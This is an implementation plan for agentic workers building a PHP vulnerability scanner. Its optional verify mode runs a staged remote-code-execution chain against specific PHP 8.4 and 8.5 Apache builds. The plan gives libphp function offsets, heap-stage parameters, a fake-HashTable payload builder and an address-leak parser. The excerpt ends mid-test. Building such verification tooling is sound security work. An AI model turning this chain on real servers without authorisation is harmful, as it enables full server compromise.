# PHP2Shell Parametric Detection and RCE Verification Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace the incorrect profile-guess/pure-chain layer with a truthful detection check and a real parametric PHP2Shell chain for the five publicly calibrated builds.

**Architecture:** Detection is one `PhpFingerprint` value object plus one `php2shell-exposure` finding, fed by the paths the engine already fetches. Verification selects one exact calibrated profile, gates on the target's version/SAPI/phpinfo preconditions, and runs the upstream parametric chain (rotate → stage 1 leak → rotate → stage 2 libphp leak → rotate → stage 3 fake HashTable → unique marker). No guess loop, no canary, no POST without `--verify`.

**Tech Stack:** PHP 8.2+, Symfony Console, Symfony YAML, Guzzle 8, PSR-7, PHPUnit 11, Box PHAR.

**Spec:** `docs/superpowers/specs/2026-10-26-php2shell-parametric-rce-design.md`

## Global Constraints

- No canary endpoint, no arming probe, no POST unless `--verify` is set.
- Only the five `verified: true` + `rce: true` profiles are selectable:
  `php-8.4.25-bookworm-aarch64`, `php-8.4.26-bookworm-amd64`,
  `php-8.5.10-bookworm-aarch64`, `php-8.5.11-bookworm-aarch64`,
  `php-8.5.11-bookworm-amd64`.
- A profile requires an exact `x.y.z` version and, when the version has multiple arches, `--arch`.
- `php2shell-rce` is Critical only when the fetched body trims to the exact 7-character marker. Every failure is Info "proof not obtained", never "safe".
- `poc.workers` is required for a real attempt; no blind pinning.
- No lab/Docker/report/generated-payload artifacts in git.
- No new runtime dependencies.
- Existing finding contract stays: non-empty `exploit` and at least one reproduce step per finding.
- Keep `src/Data/php-affected.json` and `PhpVersionDb` as the version matrix.
- The built `php2shell-tui` PHAR is rebuilt and committed only after the full suite and lab matrix pass.

## Review Focus

- A target hides the PHP version but exposes phpinfo: version detection must use the phpinfo body, and `--verify --php-version x.y.z` must still select the exact profile.
- A target has `display_errors=Off`, `post_max_size` below the computed OOM size, `memory_limit=-1`, or a non-mod_php SAPI: no payload may be sent, and the finding must say why.
- A target is 8.5.11 aarch64: `--arch aarch64` selects those offsets; without `--arch` the tool must refuse, never default to amd64.
- A target is patched 8.4.27/8.5.12 or runs FPM: zero payload bytes and no Critical.
- A proof path already exists, returns a catch-all 200, or contains a wrong marker: no false Critical; choose a random free path, then require exact marker equality.

---

## Task 1: PHP fingerprint and exposure finding

**Files:**
- Create: `src/PhpFingerprint.php`
- Create: `src/Data/repro/php2shell-exposure.md`
- Modify: `src/Check/PhpVersion.php`
- Modify: `src/Check/Php2Shell.php`
- Modify: `src/Command/ScanCommand.php`
- Create: `tests/Unit/PhpFingerprintTest.php`
- Modify: `tests/Unit/PhpChecksTest.php`
- Modify: `tests/Unit/Php2ShellTest.php`

**Interfaces:**
- Consumes: `Psr\Http\Message\ResponseInterface`, `PhpDetection::signals()`, `PhpVersionDb`, `PhpVersionAssessment::classify()`, `Reproduce`.
- Produces:
  ```php
  final class PhpFingerprint
  {
      /** @param array<string, ResponseInterface> $responses */
      public static function fromResponses(array $responses): self;
      /** @return list<array{version: string, source: string, confidence: string}> */
      public function versions(): array;
      /** @return null|array{url: string, ini: array<string, string>, sapi: ?string} */
      public function phpinfo(): ?array;
      public function sapi(): ?string;
      public function serverOs(): ?string;
      public function hasPhpSignal(): bool;
      /** @return array<string, string> */
      public function ini(): array;
      /** @return list<string> */
      public static function paths(): array;
  }
  ```
- `PhpVersion::paths()` returns `PhpFingerprint::paths()`.
- `Php2Shell` constructor adds `PhpVersionDb $db` after `bool $verify`:
  ```php
  public function __construct(
      Reproduce $reproduce,
      bool $verify,
      PhpVersionDb $db,
      ?Php2ShellPoc $poc = null,
      ?string $pocDir = null,
      ?GuessPlan $guess = null,
      ?Client $client = null,
      ?\Closure $runner = null,
      ?int $workers = null,
  )
  ```
  The old verification fields are removed in Task 2.

- [ ] **Step 1: Write the failing fingerprint tests**

Create `tests/Unit/PhpFingerprintTest.php`:

```php
public function testItExtractsVersionsFromHeadersBodyAndPhpinfo(): void
{
    $responses = [
        '/' => new Response(200, [
            'X-Powered-By' => 'PHP/8.4.26',
            'Server' => 'Apache/2.4.69 (Debian) PHP/8.4.25',
        ], '<footer>PHP 8.4.24</footer>'),
        '/phpinfo.php' => new Response(200, [], $this->phpinfoBody('8.4.26')),
    ];

    $fingerprint = PhpFingerprint::fromResponses($responses);

    self::assertSame('8.4.26', $fingerprint->versions()[0]['version']);
    self::assertSame('X-Powered-By', $fingerprint->versions()[0]['source']);
    self::assertSame('8.4.26', $fingerprint->phpinfo()['ini']['php version']);
    self::assertSame('Apache 2.0 Handler', $fingerprint->sapi());
    self::assertSame('debian', $fingerprint->serverOs());
}

public function testItParsesTheIniRowsAndInferrsSapiFromHeaders(): void
{
    $responses = ['/' => new Response(200, [
        'Server' => 'nginx/1.24.0',
        'X-Powered-By' => 'PHP/8.5.11',
    ], 'OK')];

    $fingerprint = PhpFingerprint::fromResponses($responses);

    self::assertSame('inferred: fpm', $fingerprint->sapi());
    self::assertTrue($fingerprint->hasPhpSignal());
}

public function testItFindsAVersionInTheBaselineBody(): void
{
    $responses = ['/' => new Response(200, [], '<p>PHP Version 7.4.33</p>')];

    self::assertSame('7.4.33', PhpFingerprint::fromResponses($responses)->versions()[0]['version']);
}
```

`$this->phpinfoBody('8.4.26')` returns:

```html
<html><body><h1>PHP Version 8.4.26</h1><table>
<tr><td class="e">Server API</td><td class="v">Apache 2.0 Handler</td></tr>
<tr><td class="e">session.upload_progress.enabled</td><td class="v">On</td></tr>
<tr><td class="e">memory_limit</td><td class="v">128M</td></tr>
<tr><td class="e">post_max_size</td><td class="v">256M</td></tr>
<tr><td class="e">display_errors</td><td class="v">On</td></tr>
<tr><td class="e">session.use_strict_mode</td><td class="v">0</td></tr>
</table></body></html>
```

- [ ] **Step 2: Run the tests and verify they fail**

Run: `vendor/bin/phpunit tests/Unit/PhpFingerprintTest.php -v`
Expected: FAIL with `Class "Php2ShellTui\PhpFingerprint" not found`.

- [ ] **Step 3: Implement `PhpFingerprint`**

Create `src/PhpFingerprint.php` with the interface above.

Implementation rules:
- `paths()` returns `['/', '/phpinfo.php', '/info.php']`.
- `fromResponses()` iterates the keys and keeps the three known paths.
- Version regexes: `PHP[ \/](\d+\.\d+\.\d+)` and `PHP Version\s+(\d+\.\d+\.\d+)`.
- Confidence: `X-Powered-By` = high, `Server` = medium, phpinfo = medium, body = low.
- `phpinfo()` chooses the first response whose body contains `PHP Version`; parse rows with `/<td[^>]*class="e"[^>]*>(.*?)<\/td>\s*<td[^>]*class="v"[^>]*>(.*?)<\/td>/s`, strip tags with `strip_tags`, `html_entity_decode`, lowercase the key, trim the value; add `php version` from the title.
- `sapi()` returns the phpinfo `server api` value, else `inferred: mod_php` for Apache + PHP headers, `inferred: fpm` for nginx + PHP headers, else null.
- `serverOs()` maps `debian|bookworm|bullseye|buster|trixie` to `debian`, and `ubuntu`, `alpine`, `fedora`, `centos`, `rhel`, `amazon linux`, `suse`, `arch linux` to their tokens.
- `hasPhpSignal()` returns `PhpDetection::signals($baseline) !== []`.
- Rewind the response body before and after reading.

- [ ] **Step 4: Make `PhpVersion` use the fingerprint**

Replace `PhpVersion::paths()` with `return PhpFingerprint::paths();`.
Replace `PhpVersion::candidates()` with `return PhpFingerprint::fromResponses($responses)->versions();`.
Delete the private `candidates()` method.

Add to `tests/Unit/PhpChecksTest.php`:

```php
public function testItFindsAVersionOnlyInTheBaselineBody(): void
{
    $findings = (new PhpVersion($this->db, $this->reproduce))->analyze($this->target, [
        '/' => new Response(200, [], '<p>PHP Version 8.4.26</p>'),
    ]);

    self::assertSame(Severity::Critical, $findings[0]->severity);
    self::assertStringContainsString('8.4.26', $findings[0]->evidence);
}
```

- [ ] **Step 5: Add the exposure finding to `Php2Shell`**

Keep the existing verification fields for now. Add the `PhpVersionDb $db` constructor parameter and replace `paths()`/`analyze()`:

```php
public function paths(Target $target, ?ResponseInterface $baseline): array
{
    return PhpFingerprint::paths();
}

public function analyze(Target $target, array $responses): array
{
    $fingerprint = PhpFingerprint::fromResponses($responses);
    $findings = [$this->exposureFinding($target, $fingerprint)];

    if (!$this->verify) {
        return $findings;
    }

    // The old profile/guess path remains until Task 2 replaces it.
    if ($target->pocProfile !== null) {
        $findings = array_merge($findings, $this->analyzeSingle($target));
    } elseif ($this->guess !== null) {
        $findings = array_merge($findings, $this->analyzeGuess($target));
    }

    return $findings;
}
```

`exposureFinding()`:
- Classify every version with `PhpVersionAssessment::classify($this->db, $version)`; choose the worst by severity rank, then confidence.
- If no version and `!$fingerprint->hasPhpSignal()`: Info "no PHP signal".
- If no version and `hasPhpSignal()`: High "version undetermined".
- If all versions patched: Info "not applicable".
- Otherwise evaluate the conditions:
  - SAPI: mod_php or inferred mod_php = met; FPM/other = closed; null = unknown.
  - `session.upload_progress.enabled`: `On`/`1` = met; `Off`/`0` = closed; missing = unknown.
  - `display_errors`: `On`/`1` = met; `Off`/`0` = closed; missing = unknown.
  - `session.use_strict_mode`: `0`/`Off` = met; `1`/`On` = closed; missing = unknown.
  - `memory_limit`: positive = met; `-1` = closed; missing = unknown.
  - `post_max_size`: `<= 0` = met (unlimited); positive and memory known and `post_max_size > memory_limit + 12` = met; positive and memory known and too small = closed; missing = unknown.
- Any closed condition → **Medium**; otherwise **High**.
- Evidence is one semicolon-separated string: version/source, SAPI, each ini value, `phpinfo` URL if present, and `NOT MET` for closed values. Example expected substring:
  `session.upload_progress.enabled=On; memory_limit=128M; post_max_size=256M`.
- Title: `PHP2Shell - exploitability assessment`.
- Exploit sentence: `Run --verify with the calibrated profile to prove RCE; a failed attempt is not evidence of safety.`
- Reproduce: `$this->reproduce->steps('php2shell-exposure', $target->url, $target->label())`.

Create `src/Data/repro/php2shell-exposure.md`:

```markdown
curl -sSI {url} | grep -iE 'x-powered-by|server'

curl -sS {url}/phpinfo.php | grep -iE 'PHP Version|Server API|session.upload_progress|session.use_strict_mode|memory_limit|post_max_size|display_errors'

bin/php2shell-tui scan --config <target>.yaml --no-tui --format json --verify --php-version <x.y.z> --arch <amd64|aarch64> --workers <target-maxrequestworkers>
```

- [ ] **Step 6: Write the exposure tests**

Replace the guess/single tests in `tests/Unit/Php2ShellTest.php` with:

```php
public function testTheDefaultScanReportsTheExposureChecklist(): void
{
    $check = new Php2Shell($this->reproduce, false, $this->db);
    $findings = $check->analyze($this->target, [
        '/' => new Response(200, [
            'X-Powered-By' => 'PHP/8.4.26',
            'Server' => 'Apache/2.4.69 (Debian)',
        ], 'OK'),
        '/phpinfo.php' => new Response(200, [], $this->phpinfoBody()),
    ]);

    $exposure = array_values(array_filter(
        $findings,
        static fn ($f): bool => $f->id === 'php2shell-exposure',
    ))[0];

    self::assertSame(Severity::High, $exposure->severity);
    self::assertStringContainsString('session.upload_progress.enabled=On', $exposure->evidence);
    self::assertStringContainsString('Apache 2.0 Handler', $exposure->evidence);
    self::assertStringContainsString('memory_limit=128M', $exposure->evidence);
}

public function testAFpmTargetIsMediumAndHasNoVerificationClaim(): void
{
    $check = new Php2Shell($this->reproduce, false, $this->db);
    $findings = $check->analyze($this->target, [
        '/' => new Response(200, ['X-Powered-By' => 'PHP/8.4.26'], 'OK'),
        '/phpinfo.php' => new Response(200, [], $this->phpinfoBody('FPM/FastCGI')),
    ]);

    $exposure = array_values(array_filter(
        $findings,
        static fn ($f): bool => $f->id === 'php2shell-exposure',
    ))[0];

    self::assertSame(Severity::Medium, $exposure->severity);
    self::assertStringContainsString('FPM/FastCGI', $exposure->evidence);
}
```

Add to `tests/Unit/Php2ShellTest.php` a `phpinfoBody(string $sapi = 'Apache 2.0 Handler')` helper that returns the HTML from Step 1 with the SAPI replaced.

Update every `new Php2Shell(...)` in `tests/Unit/Php2ShellTest.php` and `tests/Integration/ScanCommandTest.php` to pass `$this->db` as the third argument. The old guess/single verification tests are deleted; the old verification code remains only until Task 2 and is not tested here.

- [ ] **Step 7: Wire the database into `ScanCommand`**

In `src/Command/ScanCommand.php`, pass the existing `$db` to `Php2Shell`:

```php
'php2shell' => new Php2Shell(
    $reproduce,
    $verify,
    $db,
    new Php2ShellPoc(
        client: $client,
        timeout: $config->pocTimeout,
        maxWorkers: $config->pocMaxWorkers,
    ),
    $dataDir . '/poc',
    $guess,
    $client,
    workers: $config->pocWorkers,
),
```

- [ ] **Step 8: Run the unit suite**

Run: `vendor/bin/phpunit --no-coverage`
Expected: PASS. The old guess tests that asserted no findings without `--verify` are replaced by the exposure tests. The old profile/chain tests still pass.

- [ ] **Step 9: Commit**

```bash
git add src/PhpFingerprint.php src/Check/PhpVersion.php src/Check/Php2Shell.php src/Command/ScanCommand.php src/Data/repro/php2shell-exposure.md tests/Unit/PhpFingerprintTest.php tests/Unit/PhpChecksTest.php tests/Unit/Php2ShellTest.php
git commit -m "feat: report PHP2Shell exposure with phpinfo and SAPI evidence"
```

---

## Task 2: Verified profiles, catalog, plan, and removal of guess mode

**Files:**
- Rewrite: `src/Poc/Profile.php`
- Create: `src/Poc/ProfileCatalog.php`
- Create: `src/Poc/PocPlan.php`
- Delete: `src/Poc/GuessPlan.php`
- Delete: `src/Poc/PayloadBuilder.php`
- Delete: `src/Poc/LeakParser.php`
- Delete: `src/Poc/Php2ShellPoc.php`
- Delete: `src/Poc/RawHttp.php`
- Modify: `src/Poc/PocResult.php`
- Modify: `src/Check/Php2Shell.php`
- Modify: `src/Config.php`
- Modify: `src/Command/ScanCommand.php`
- Replace: `src/Data/poc/*.json` with the five profiles
- Create: `tests/Unit/ProfileTest.php`
- Create: `tests/Unit/ProfileCatalogTest.php`
- Create: `tests/Unit/PocPlanTest.php`
- Delete: `tests/Unit/PocProfileTest.php`
- Delete: `tests/Unit/PayloadBuilderTest.php`
- Delete: `tests/Unit/LeakParserTest.php`
- Delete: `tests/Unit/RawHttpTest.php`
- Delete: `tests/Unit/Php2ShellPocTest.php`
- Modify: `tests/Unit/ConfigTest.php`
- Modify: `tests/Unit/SmokeTest.php`
- Modify: `tests/Integration/ScanCommandTest.php`
- Modify: `tests/Fixture/profile-8.4.26.json`

**Interfaces:**
- Consumes: the five profile JSON files from the spec §4.3.1; `Server` OS names.
- Produces:
  ```php
  final class Profile
  {
      public static function fromFile(string $path): self;
      public static function fromArray(array $data): self;
      public function id(): string;
      public function phpVersion(): string;
      public function branch(): string;
      public function fixedIn(): ?string;
      public function sapi(): string;
      public function arch(): string;
      public function distro(): ?string;
      public function rceVerified(): bool;
      /** @return array{zif_system: int, zval_ptr_dtor: int, htdata: int} */
      public function libphp(): array;
      public function stage1N(): int;
      public function stage1ForgeLen(): int;
      public function stage2T(): int;
      public function stage2V(): int;
      /** @return list<array{0: int, 1: int}> */
      public function stage3Pads(): array;
      public function stage3Carrier(): bool;
      public function oomMb(): int;
      public function oomMarginMb(): int;
      /** @return list<int> */
      public function memoryLimitTestedMb(): array;
      public function upstreamProfile(): string;
      public function data(): array;
  }

  final class ProfileCatalog
  {
      public function __construct(string $directory);
      /** @return list<Profile> */
      public function all(): array;
      /** @return array{profile: ?Profile, reason: string} */
      public function select(?string $version, ?string $arch, ?string $profile, ?string $serverOs): array;
  }

  final class PocPlan
  {
      public function __construct(
          public readonly ?string $profile = null,
          public readonly ?string $version = null,
          public readonly ?string $arch = null,
          public readonly ?int $workers = null,
          public readonly ?int $memoryLimitMb = null,
          public readonly int $timeout = 300,
          public readonly int $requestTimeout = 90,
          public readonly int $retries = 3,
          public readonly int $maxWorkers = 200,
      );
      public function withMemoryLimit(int $memoryLimitMb): self;
  }
  ```

- [ ] **Step 1: Write the failing profile tests**

Create `tests/Unit/ProfileTest.php`:

```php
public function testTheVerifiedEightFourTwoSixProfileLoads(): void
{
    $profile = Profile::fromFile(__DIR__ . '/../../src/Data/poc/php-8.4.26-bookworm-amd64.json');

    self::assertSame('php-8.4.26-bookworm-amd64', $profile->id());
    self::assertSame('8.4.26', $profile->phpVersion());
    self::assertSame('amd64', $profile->arch());
    self::assertSame('apache2handler', $profile->sapi());
    self::assertTrue($profile->rceVerified());
    self::assertSame(0x465370, $profile->libphp()['zif_system']);
    self::assertSame(0x65eb60, $profile->libphp()['zval_ptr_dtor']);
    self::assertSame(0x690d8, $profile->libphp()['htdata']);
    self::assertSame(841, $profile->stage1N());
    self::assertSame(79, $profile->stage1ForgeLen());
    self::assertSame(406, $profile->stage2T());
    self::assertSame(16, $profile->stage2V());
    self::assertCount(6, $profile->stage3Pads());
    self::assertTrue($profile->stage3Carrier());
}

public function testAnUnverifiedProfileIsNotSelectableRce(): void
{
    $data = json_decode((string) file_get_contents(
        __DIR__ . '/../../src/Data/poc/php-8.4.26-bookworm-amd64.json'
    ), true, 512, JSON_THROW_ON_ERROR);
    $data['verified'] = true;
    $data['rce'] = false;

    self::assertFalse(Profile::fromArray($data)->rceVerified());
}
```

Create `tests/Unit/PocPlanTest.php`:

```php
public function testWithMemoryLimitReturnsANewPlan(): void
{
    $plan = new PocPlan(workers: 150, memoryLimitMb: null);
    $next = $plan->withMemoryLimit(128);

    self::assertNull($plan->memoryLimitMb);
    self::assertSame(128, $next->memoryLimitMb);
    self::assertSame(150, $next->workers);
}

public function testItRejectsWorkersAboveTheCap(): void
{
    $this->expectException(\InvalidArgumentException::class);
    new PocPlan(workers: 201, maxWorkers: 200);
}
```

Create `tests/Unit/ProfileCatalogTest.php`:

```php
private function catalog(): ProfileCatalog
{
    return new ProfileCatalog(__DIR__ . '/../../src/Data/poc');
}

public function testItSelectsAnExactVersionAndArch(): void
{
    $selection = $this->catalog()->select('8.4.26', 'amd64', null, 'debian');

    self::assertNotNull($selection['profile']);
    self::assertSame('php-8.4.26-bookworm-amd64', $selection['profile']->id());
}

public function testItRequiresAnArchWhenTwoBuildsShareAVersion(): void
{
    $selection = $this->catalog()->select('8.5.11', null, null, 'debian');

    self::assertNull($selection['profile']);
    self::assertStringContainsString('arch', $selection['reason']);
}

public function testItRejectsABranchInsteadOfAPatchRelease(): void
{
    $selection = $this->catalog()->select('8.5', null, null, 'debian');

    self::assertNull($selection['profile']);
    self::assertStringContainsString('patch release', $selection['reason']);
}

public function testItRejectsAProfileForAnUncalibratedVersion(): void
{
    $selection = $this->catalog()->select('7.4.33', null, null, 'debian');

    self::assertNull($selection['profile']);
    self::assertStringContainsString('no calibrated profile', $selection['reason']);
}

public function testItRejectsADistroMismatch(): void
{
    $selection = $this->catalog()->select('8.4.26', 'amd64', null, 'ubuntu');

    self::assertNull($selection['profile']);
    self::assertStringContainsString('debian', $selection['reason']);
}

public function testItSelectsAnExplicitProfileWhenTheVersionIsHidden(): void
{
    $selection = $this->catalog()->select(
        null,
        null,
        'php-8.4.26-bookworm-amd64',
        null,
    );

    self::assertNotNull($selection['profile']);
    self::assertSame('php-8.4.26-bookworm-amd64', $selection['profile']->id());
}

public function testItRejectsAnUnverifiedProfileEvenWhenExplicitlyPassed(): void
{
    $path = tempnam(sys_get_temp_dir(), 'p2s-unverified-');
    self::assertNotFalse($path);
    $data = json_decode((string) file_get_contents(
        __DIR__ . '/../../src/Data/poc/php-8.4.26-bookworm-amd64.json'
    ), true, 512, JSON_THROW_ON_ERROR);
    $data['rce'] = false;
    file_put_contents($path, json_encode($data, JSON_THROW_ON_ERROR));

    try {
        $selection = $this->catalog()->select(null, null, $path, null);
        self::assertNull($selection['profile']);
        self::assertStringContainsString('not verified', $selection['reason']);
    } finally {
        @unlink($path);
    }
}

public function testExactlyFiveVerifiedProfilesShip(): void
{
    self::assertCount(5, $this->catalog()->all());
}
```

Add to `tests/Unit/ProfileTest.php`:

```php
public function testExactlyFiveProfilesShip(): void
{
    self::assertCount(5, glob(__DIR__ . '/../../src/Data/poc/*.json') ?: []);
}
```

- [ ] **Step 2: Run the tests and verify they fail**

Run: `vendor/bin/phpunit tests/Unit/ProfileTest.php tests/Unit/ProfileCatalogTest.php tests/Unit/PocPlanTest.php -v`
Expected: FAIL with missing classes or the old `Profile` API.

- [ ] **Step 3: Implement the profile schema and the five JSON files**

Rewrite `src/Poc/Profile.php` to the devploit schema.

Parsing rules:
- `id` from `id` or `name`; `php_version`; `branch`; `fixed_in` nullable; `sapi`; `arch` normalized; `distro` from `distro` or `os`; `verified` and `rce` booleans; `upstream_profile` (default `bookworm`); `config` object.
- `libphp` hex strings or ints; require `zif_system`, `zval_ptr_dtor`, `htdata` for `rceVerified`.
- `stages` require `stage1_n`, `stage1_forge_len`, `stage2_t`, `stage2_v`, `stage3_pads`, `stage3_carrier` for `rceVerified`; `stage3_pads` is a list of `[int, int]` pairs, non-negative.
- `oom_mb` default 12; `oom_margin_mb` default 12; `memory_limit_tested_mb` list of ints.
- `rceVerified()` is `verified && rce`.
- Throw `InvalidArgumentException` with the profile path/field on bad input.

Add the five JSON files from the spec §4.3.1. Use the `name` values as ids:

```
php-8.4.25-bookworm-aarch64
php-8.4.26-bookworm-amd64
php-8.5.10-bookworm-aarch64
php-8.5.11-bookworm-aarch64
php-8.5.11-bookworm-amd64
```

Copy the devploit values verbatim; add `"source": "https://github.com/devploit/php2shell (MIT)"`.
Delete the old nine uncalibrated profiles and the old 8.4.26 pure profile.

Replace `tests/Fixture/profile-8.4.26.json` with a copy of the new verified profile (or delete it if no test uses it after this task).

- [ ] **Step 4: Implement `PocPlan`**

Create `src/Poc/PocPlan.php` with the interface above.

Validation:
- `workers !== null && workers < 1` → throw.
- `memoryLimitMb !== null && memoryLimitMb < 1` → throw.
- `timeout < 1 || requestTimeout < 1 || retries < 1` → throw.
- `maxWorkers < 1` → throw.
- `workers !== null && workers > maxWorkers` → throw.

`withMemoryLimit(int $memoryLimitMb): self` returns a clone with the new value; validate `>= 1`.

- [ ] **Step 5: Implement `ProfileCatalog`**

Create `src/Poc/ProfileCatalog.php`.

- `all()` globs `*.json`, loads each with `Profile::fromFile`, caches, and throws on an invalid file.
- `select()`:
  - If `$profile` is a readable file: load it; if not, find by id/name; no match → reason `no profile matches ...`; multiple → reason.
  - An explicit profile still requires `$version` match when `$version !== null`, requires `distro` match when `$serverOs !== null`, and requires `rceVerified()`.
  - If `$version` is null: reason `no PHP version detected; pass --php-version X.Y.Z`.
  - If `$version` matches `^\d+\.\d+$`: reason `specify an exact patch release (x.y.z); available: ...`.
  - Filter by exact `phpVersion()`; if `$arch !== null`, filter by arch.
  - If no exact profile: reason `no calibrated profile for PHP <version> (<arch>); available: ...`.
  - If more than one: reason `multiple builds for PHP <version>; pass --arch amd64|aarch64`.
  - If the selected profile is not `rceVerified()`: reason `profile ... is not verified for RCE`.
  - If `$serverOs !== null` and the profile `distro()` is not null and normalized values differ: reason `target looks like <os>, profile is <distro>`.
  - Return `['profile' => $profile, 'reason' => '']` on success.

- [ ] **Step 6: Remove the old chain and simplify the temporary check path**

Delete `src/Poc/GuessPlan.php`, `PayloadBuilder.php`, `LeakParser.php`, `Php2ShellPoc.php`, `RawHttp.php` and their tests.

In `src/Check/Php2Shell.php`:
- Constructor becomes:
  ```php
  public function __construct(
      private readonly Reproduce $reproduce,
      private readonly bool $verify,
      private readonly PhpVersionDb $db,
      private readonly ?ProfileCatalog $catalog = null,
      private readonly ?PocPlan $plan = null,
      private readonly ?Client $client = null,
  )
  ```
- Delete `analyzeSingle()`, `analyzeGuess()`, `loadProfile()`, `reportVerify()` and the `$runner`/`$workers` fields.
- After the exposure finding, when `$verify`:
  - if `$this->catalog === null || $this->plan === null` → `inconclusive($target, 'verification is not configured')`;
  - else → `inconclusive($target, 'verification runner is not wired yet')`.
  Task 6 replaces this with the real flow.
- Keep `pocInconclusive()`; it now takes only `Target` and `string $reason`.

In `src/Config.php` replace the PoC fields and parsing:
```php
public function __construct(
    // existing target/check/options fields unchanged ...
    public readonly int $pocTimeout,
    public readonly int $pocMaxWorkers,
    public readonly ?int $pocWorkers,
    public readonly ?int $pocMemoryLimit,
    public readonly int $pocRequestTimeout,
    public readonly int $pocRetries,
    public readonly ?string $pocProfile,
)
```
- `poc.workers` nullable positive int; `poc.memory_limit` nullable positive int; `poc.timeout` default 300; `poc.request_timeout` default 90; `poc.retries` default 3; `poc.max_workers` default 200; `poc.profile` nullable local profile id/path.
- Remove `pocGuess`, `pocProfiles`, `pocArch`, `pocMaxAttempts`, `pocTotalTimeout` and their helpers `pocBool`, `localProfiles`, `optionalArch` if unused.
- Ignore the removed keys if present; the README documents the migration.

Add to `tests/Unit/ConfigTest.php`:

```php
public function testItParsesTheCalibratedPocPlanFields(): void
{
    $config = Config::fromArray([
        'targets' => ['https://app.example/'],
        'poc' => [
            'workers' => 150,
            'memory_limit' => 128,
            'timeout' => 300,
            'request_timeout' => 90,
            'retries' => 3,
            'max_workers' => 200,
            'profile' => 'php-8.4.26-bookworm-amd64',
        ],
    ]);

    self::assertSame(150, $config->pocWorkers);
    self::assertSame(128, $config->pocMemoryLimit);
    self::assertSame(300, $config->pocTimeout);
    self::assertSame(90, $config->pocRequestTimeout);
    self::assertSame(3, $config->pocRetries);
    self::assertSame(200, $config->pocMaxWorkers);
    self::assertSame('php-8.4.26-bookworm-amd64', $config->pocProfile);
}
```

In `src/Command/ScanCommand.php`:
- Remove the `GuessPlan` import and construction.
- Add options:
  `--php-version` (VALUE_REQUIRED, ''), `--arch` (VALUE_REQUIRED, ''), `--profile` (VALUE_REQUIRED, ''), `--workers` (VALUE_REQUIRED, ''), `--memory-limit` (VALUE_REQUIRED, '').
- Parse each empty string as null; reject arch outside `amd64|aarch64`; reject non-positive workers/memory.
- Build:
  ```php
  $plan = new PocPlan(
      profile: $profileOption ?? $config->pocProfile,
      version: $versionOption,
      arch: $archOption,
      workers: $workersOption ?? $config->pocWorkers,
      memoryLimitMb: $memoryOption ?? $config->pocMemoryLimit,
      timeout: $config->pocTimeout,
      requestTimeout: $config->pocRequestTimeout,
      retries: $config->pocRetries,
      maxWorkers: $config->pocMaxWorkers,
  );
  ```
- Construct `Php2Shell` with `$reproduce, $verify, $db, new ProfileCatalog($dataDir.'/poc'), $plan, $client`.
- Remove the `Php2ShellPoc` construction and the `$guess` variable.

Update `tests/Unit/ConfigTest.php`, `tests/Unit/SmokeTest.php`, `tests/Integration/ScanCommandTest.php`:
- New `Config` constructor fields.
- `--verify` now returns the `php2shell-exposure` finding plus `php2shell-poc-inconclusive` with `verification runner is not wired yet`; no POST.
- The old guess tests are deleted.

- [ ] **Step 7: Run the suite**

Run: `vendor/bin/phpunit --no-coverage`
Expected: PASS. The deleted old-chain tests are gone; the new profile/catalog/plan tests pass; the integration test asserts the temporary Info.

- [ ] **Step 8: Commit**

```bash
git add -A src tests
git commit -m "refactor: ship only calibrated PHP2Shell profiles and remove guess mode"
```

---

## Task 3: Parametric payload builder and cookie parser

**Files:**
- Create: `src/Poc/PayloadBuilder.php`
- Create: `src/Poc/CookieLeakParser.php`
- Create: `tests/Unit/PayloadBuilderTest.php`
- Create: `tests/Unit/CookieLeakParserTest.php`

**Interfaces:**
- Consumes: profile stage values from Task 2.
- Produces:
  ```php
  final class PayloadBuilder
  {
      public function rotateA(string $path, int $hugeMb): void;
      public function rotateB(string $path): void;
      public function stage1A(string $path, int $hugeMb): void;
      /** @return void */
      public function stage1B(string $path, int $stage1N, int $forgeLen): void;
      public function stage2A(string $path, int $hugeMb): void;
      public function stage2B(string $path, int $stage2T, int $stage2V): void;
      /** @param list<array{0: int, 1: int}> $pads */
      public function stage3A(string $path, array $pads, int $hugeMb): void;
      public function stage3B(string $path, string $ht, ?string $ref, ?string $carrier): void;
      /** @return array{ht: string, ref: ?string, carrier: ?string} */
      public function fakePayload(int $htdata, int $zif, string $command): array;
  }

  final class CookieLeakParser
  {
      public static function cookie(string $response): string;
      public static function chunkBase(string $cookie): int;
      public static function libphpBase(string $cookie, int $dtorOffset): int;
  }
  ```

- [ ] **Step 1: Write the failing golden tests**

Create `tests/Unit/PayloadBuilderTest.php`:

```php
private function hashFile(string $path): string
{
    return (string) hash_file('sha256', $path);
}

public function testRotateBodiesMatchTheOracle(): void
{
    $builder = new PayloadBuilder();
    $a = $this->tmp . '/rotate-a.bin';
    $b = $this->tmp . '/rotate-b.bin';

    $builder->rotateA($a, 1);
    $builder->rotateB($b);

    self::assertSame(4_123_100, filesize($a));
    self::assertSame('8e549480d0cd07a14b357b422e0d05a207a32a01a082393350ab3f1d4923c6df', $this->hashFile($a));
    self::assertSame(192, filesize($b));
    self::assertSame('5b29950f7d421c5e7336441cf370d07e95a196b47c905bfbddef94e0d36c6937', $this->hashFile($b));
}

public function testStageOneBodiesMatchTheOracle(): void
{
    $builder = new PayloadBuilder();
    $a = $this->tmp . '/stage1-a.bin';
    $b = $this->tmp . '/stage1-b.bin';
    $b63 = $this->tmp . '/stage1-b63.bin';

    $builder->stage1A($a, 1);
    $builder->stage1B($b, 841, 79);
    $builder->stage1B($b63, 841, 63);

    self::assertSame(1_121_101, filesize($a));
    self::assertSame('0eec22a12ab40a92707f6c20b9a26735f2a51830a8b525c9a63244700bb3cca6', $this->hashFile($a));
    self::assertSame(93_685, filesize($b));
    self::assertSame('ecaf5a1898a7e0dd754c7633334a03f58059b262cfa870d366dc97af342f2397', $this->hashFile($b));
    self::assertSame(93_669, filesize($b63));
    self::assertSame('b234975725a875c6813bfac2219dad8fa447bace8a4445cbd254bc37309e8ac4', $this->hashFile($b63));
}

public function testStageTwoBodiesMatchTheOracle(): void
{
    $builder = new PayloadBuilder();
    $a = $this->tmp . '/stage2-a.bin';
    $b = $this->tmp . '/stage2-b.bin';

    $builder->stage2A($a, 1);
    $builder->stage2B($b, 406, 16);

    self::assertSame(1_159_139, filesize($a));
    self::assertSame('acf5edb8783d9a47163119acef51a8409c1ebb15f0d2cc8659aeefc9fff168f2', $this->hashFile($a));
    self::assertSame(83_032, filesize($b));
